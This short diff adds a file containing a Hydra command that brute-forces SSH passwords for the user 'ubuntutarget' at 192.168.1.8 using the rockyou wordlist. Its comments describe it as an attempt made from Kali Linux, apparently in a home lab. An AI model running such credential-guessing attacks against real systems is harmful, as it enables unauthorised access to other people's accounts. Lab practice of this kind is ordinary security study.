@@ -1,0 +1,4 @@
+hydra -l ubuntutarget -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.8
+
+# ubuntutarget is the username I attempted to access via SSH using the hydra tool in Kali Linux with an IP of 192.168.1.8. 
+# The credentials used come from the file rockyou.txt
